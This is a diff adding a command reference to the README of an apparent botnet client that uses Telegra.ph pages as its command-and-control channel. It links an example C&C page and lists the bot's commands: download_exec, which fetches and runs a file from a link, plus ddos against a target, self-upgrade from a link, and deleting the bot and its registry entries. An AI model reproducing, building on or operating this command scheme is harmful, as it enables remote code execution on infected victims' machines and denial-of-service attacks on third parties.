@@ -21,6 +21,17 @@ Example botnet client which uses Telegra.ph as C&C server.
 Notice, that this is not production ready version. 
 There are many bugs which are waiting to fix.
 
+## Example & List of commands
+Example of C&C server [here](https://telegra.ph/Cls93sog103ekfSfKTEsto294kfaozwkd394-rktkcsd-krfasseegpe11-03-20).
+Botnet uses next syntax - `command{split}value` or `command{split}value{sep}value's_value`
+### Available commands
+* `download_exec{split}LINK_TO_FILE` - download and run file which is located at LINK_TO_FILE
+* `ddos{split}TARGET{sep}TIME` - ddos TARGET for TIME seconds
+* `upgrade{split}LINK_TO_FILE{sep}VERSION` - download and install botnet update which located at LINK_TO_FILE. Update will be installed only if botnet's file version is lower than VERSION
+* `stop{split}` - you should use that command every time after executing other's ones
+* `delete_botnet{split}` - delete botnet exe and it's registry notes from client's PC
+* `exit{split}` - close botnet's executive file
+
 ## Help
  
 If you need any help at all, feel free to post a issue.
